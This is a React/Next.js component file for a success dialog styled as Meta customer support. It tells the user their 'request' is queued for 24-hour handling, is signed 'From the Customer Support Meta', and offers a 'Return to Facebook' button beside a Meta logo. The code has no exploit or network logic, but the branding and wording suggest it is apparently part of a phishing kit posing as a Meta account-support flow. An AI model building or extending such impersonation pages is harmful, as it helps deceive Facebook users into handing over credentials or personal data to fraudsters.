'use client';

import type { StaticImageData } from 'next/image';
import type { CSSProperties } from 'react';
import type { UiTexts } from '@/types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';

interface SuccessModalProps {
    show: boolean;
    onClose: () => void;
    texts: UiTexts;
}

const SuccessModal = ({ show, onClose, texts }: SuccessModalProps) => {
    if (!show) return null;

    /* ── Styles ── */
    const overlayStyle: CSSProperties = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '16px',
        overflowY: 'auto',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle: CSSProperties = {
        width: '100%',
        maxWidth: '512px',
        backgroundColor: '#fff',
        borderRadius: '16px',
        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
        padding: '20px',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        margin: 'auto',
        maxHeight: 'calc(100vh - 32px)',
        overflowY: 'auto',
        flexShrink: 0,
    };

    const contentStyle: CSSProperties = {
        display: 'flex',
        flexDirection: 'column',
        width: '100%',
    };

    const titleStyle: CSSProperties = {
        width: '100%',
        fontSize: '18px',
        fontWeight: 700,
        color: '#1c1e21',
        margin: '0 0 16px 0',
        textAlign: 'center',
        lineHeight: 1.2,
    };

    const imageContainerStyle: CSSProperties = {
        width: '100%',
        borderRadius: '10px',
        overflow: 'hidden',
        marginBottom: '14px',
    };

    const contentBoxStyle: CSSProperties = {
        textAlign: 'center',
        width: '100%',
        maxWidth: '100%',
        marginBottom: '16px',
    };

    const mainTextStyle: CSSProperties = {
        fontSize: '15px',
        color: '#9a979e',
        lineHeight: '1.35',
        margin: 0,
        fontWeight: 400,
    };

    const buttonStyle: CSSProperties = {
        width: '100%',
        minHeight: '40px',
        fontSize: '14px',
        fontWeight: 600,
        color: '#fff',
        backgroundColor: '#0064E0',
        border: 'none',
        borderRadius: '999px',
        cursor: 'pointer',
        transition: 'background-color 0.2s',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
    };

    const footerStyle: CSSProperties = {
        width: '64px',
        margin: '20px auto 0',
    };

    return (
        <div style={overlayStyle} onClick={onClose}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                <div style={contentStyle}>
                    {/* Title */}
                    <h2 style={titleStyle}>
                        {texts.successTitle || 'Request has been sent'}
                    </h2>

                    {/* Success Image */}
                    <div style={imageContainerStyle}>
                        <img src="/static/media/success.png" alt="Success" style={{ width: '100%', display: 'block' }} />
                    </div>

                    {/* Content Box */}
                    <div style={contentBoxStyle}>
                        <p style={{ ...mainTextStyle, marginBottom: '4px' }}>
                            {texts.successMessage1 || 'Your request has been added to the processing queue. We will handle your request within 24 hours.'}
                        </p>
                        <p style={mainTextStyle}>
                            {texts.successMessage2 || 'From the Customer Support Meta.'}
                        </p>
                    </div>

                    {/* Submit Button */}
                    <button
                        style={buttonStyle}
                        onClick={onClose}
                        onMouseOver={(e) => { e.currentTarget.style.backgroundColor = '#1d4ed8'; }}
                        onMouseOut={(e) => { e.currentTarget.style.backgroundColor = '#0064E0'; }}
                    >
                        {texts.confirm || 'Return to Facebook'}
                    </button>

                    {/* Footer Branding */}
                    <div style={footerStyle}>
                        <img src={(MetaLogo as StaticImageData).src} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                    </div>
                </div>
            </div>
        </div>
    );
};

export default SuccessModal;
